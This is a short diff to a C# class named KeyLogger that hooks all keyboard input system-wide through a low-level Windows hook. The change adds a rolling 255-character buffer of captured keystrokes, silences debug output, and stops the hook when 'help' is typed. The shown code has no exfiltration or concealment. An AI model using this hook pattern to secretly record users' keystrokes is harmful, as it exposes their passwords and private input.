@@ -7,6 +7,7 @@ public class KeyLogger {
     private static IntPtr hookId = IntPtr.Zero;
     private static LowLevelKeyboardProc proc = HookCallback;
     private static string currentInput = "";
+    private const int MaxInputLength = 255;
 
     public static void Start() {
         hookId = SetHook(proc);
@@ -31,8 +32,12 @@ public class KeyLogger {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
             string key = ((Keys)vkCode).ToString();
-            Console.WriteLine(key +" : " + currentInput.Length);
+            // Console.WriteLine(key +" : " + currentInput.Length);
             currentInput += key.ToLower();
+            if (currentInput.Length > MaxInputLength) {
+                currentInput = currentInput.Substring(currentInput.Length - MaxInputLength);
+                // Console.WriteLine(currentInput);
+            }
             if (currentInput.EndsWith("help")) {
                 Stop();
             }
